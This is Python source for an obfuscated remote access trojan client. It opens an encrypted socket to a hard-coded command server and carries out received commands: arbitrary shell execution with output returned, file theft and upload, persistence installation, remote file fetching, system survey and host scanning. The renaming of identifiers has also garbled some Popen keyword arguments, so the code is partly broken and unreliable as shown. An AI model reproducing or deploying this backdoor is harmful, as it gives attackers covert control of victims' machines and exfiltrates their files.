#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import AES_decrypt, AES_encrypt, diffiehellman
    from core.filesock import recvfile, sendfile
    from core.persistence import run
    from core.scan import single_host
    from core.survey import run
    from core.toolkit import wget, unzip
except ImportError as zSQuydkJMsPNVzENXDPmCbwOwqLSRyPx:
    print(zSQuydkJMsPNVzENXDPmCbwOwqLSRyPx)
    sys.exit(0)
cFTahiHxvdetIbBbmdxhxWwdaVQXaYzC = sys.platform
EyLjjtFqMSUvNyBqWVjNXuVVpniibpHw      = 'localhost'
AFPHdRCcwGwQDLdCKYSIPHdNhVWAnhcz      = 1337
dgTKeUCBBHviCREcfTHhRFOwELDrExCd    = 'b14ce95fa4c33ac2803782d18341869f'
def apRphnlxUcsIDtHUJyLyvNHwJmbtrVOc():
    paPxCyLsguCunaNIkwVLKlDZZZFWMoCt = socket.socket()
    paPxCyLsguCunaNIkwVLKlDZZZFWMoCt.connect((EyLjjtFqMSUvNyBqWVjNXuVVpniibpHw, AFPHdRCcwGwQDLdCKYSIPHdNhVWAnhcz))
    VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx = diffiehellman(paPxCyLsguCunaNIkwVLKlDZZZFWMoCt)
    while True:
        NnkNDAParHDXWCOtvnQWVEggaQfFUASz = paPxCyLsguCunaNIkwVLKlDZZZFWMoCt.recv(1024)
        NnkNDAParHDXWCOtvnQWVEggaQfFUASz = AES_decrypt(NnkNDAParHDXWCOtvnQWVEggaQfFUASz, VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx)
        SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa, _, jmlpNUxeWAFQuivJBIojsxoHxxNnQQgq = NnkNDAParHDXWCOtvnQWVEggaQfFUASz.partition(' ') 
        if SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'quit':
            paPxCyLsguCunaNIkwVLKlDZZZFWMoCt.close()
            sys.exit(0)
        elif SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'run':
            byNonQKdAgaTNfZVRHQHERjfShPLfSkp = subprocess.Popen(jmlpNUxeWAFQuivJBIojsxoHxxNnQQgq, shell=True,
                      NYgYPeOXmpwpNUxyvzCePlueEdUeGmbC=subprocess.PIPE, stderr=subprocess.PIPE,
                      aalXOjAtBigBemuIcuckMtnlmyGnijgD=subprocess.PIPE)
            byNonQKdAgaTNfZVRHQHERjfShPLfSkp = byNonQKdAgaTNfZVRHQHERjfShPLfSkp.NYgYPeOXmpwpNUxyvzCePlueEdUeGmbC.read() + byNonQKdAgaTNfZVRHQHERjfShPLfSkp.stderr.read()
            paPxCyLsguCunaNIkwVLKlDZZZFWMoCt.sendall(AES_encrypt(byNonQKdAgaTNfZVRHQHERjfShPLfSkp, VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx))
        elif SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'download':
            for GxhGoVRmFzwhkwycQVfsaLieBKigPxCK in jmlpNUxeWAFQuivJBIojsxoHxxNnQQgq.split():
                GxhGoVRmFzwhkwycQVfsaLieBKigPxCK = GxhGoVRmFzwhkwycQVfsaLieBKigPxCK.strip()
                sendfile(paPxCyLsguCunaNIkwVLKlDZZZFWMoCt, GxhGoVRmFzwhkwycQVfsaLieBKigPxCK, VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx)
        elif SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'upload':
            for GxhGoVRmFzwhkwycQVfsaLieBKigPxCK in jmlpNUxeWAFQuivJBIojsxoHxxNnQQgq.split():
                GxhGoVRmFzwhkwycQVfsaLieBKigPxCK = GxhGoVRmFzwhkwycQVfsaLieBKigPxCK.strip()
                recvfile(paPxCyLsguCunaNIkwVLKlDZZZFWMoCt, GxhGoVRmFzwhkwycQVfsaLieBKigPxCK, VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx)
        elif SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'rekey':
            VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx = diffiehellman(paPxCyLsguCunaNIkwVLKlDZZZFWMoCt)
        elif SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'persistence':
            byNonQKdAgaTNfZVRHQHERjfShPLfSkp = run(cFTahiHxvdetIbBbmdxhxWwdaVQXaYzC)
            paPxCyLsguCunaNIkwVLKlDZZZFWMoCt.send(AES_encrypt(byNonQKdAgaTNfZVRHQHERjfShPLfSkp, VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx))
        elif SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'wget':
            byNonQKdAgaTNfZVRHQHERjfShPLfSkp = wget(jmlpNUxeWAFQuivJBIojsxoHxxNnQQgq)
            paPxCyLsguCunaNIkwVLKlDZZZFWMoCt.send(AES_encrypt(byNonQKdAgaTNfZVRHQHERjfShPLfSkp, VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx))
        elif SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'unzip':
            byNonQKdAgaTNfZVRHQHERjfShPLfSkp = unzip(jmlpNUxeWAFQuivJBIojsxoHxxNnQQgq)
            paPxCyLsguCunaNIkwVLKlDZZZFWMoCt.send(AES_encrypt(byNonQKdAgaTNfZVRHQHERjfShPLfSkp, VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx))
        elif SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'survey':
            byNonQKdAgaTNfZVRHQHERjfShPLfSkp = run(cFTahiHxvdetIbBbmdxhxWwdaVQXaYzC)
            paPxCyLsguCunaNIkwVLKlDZZZFWMoCt.send(AES_encrypt(byNonQKdAgaTNfZVRHQHERjfShPLfSkp, VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx))
        elif SbDtcQkjUWjoIoDYleQTQHlUXsVzBXoa == 'scan':
            byNonQKdAgaTNfZVRHQHERjfShPLfSkp = single_host(jmlpNUxeWAFQuivJBIojsxoHxxNnQQgq)
            paPxCyLsguCunaNIkwVLKlDZZZFWMoCt.send(AES_encrypt(byNonQKdAgaTNfZVRHQHERjfShPLfSkp, VNEYfxUnNHeQsTxTPKmALBmDRiVfNIxx))
if __name__ == '__main__':
    apRphnlxUcsIDtHUJyLyvNHwJmbtrVOc()
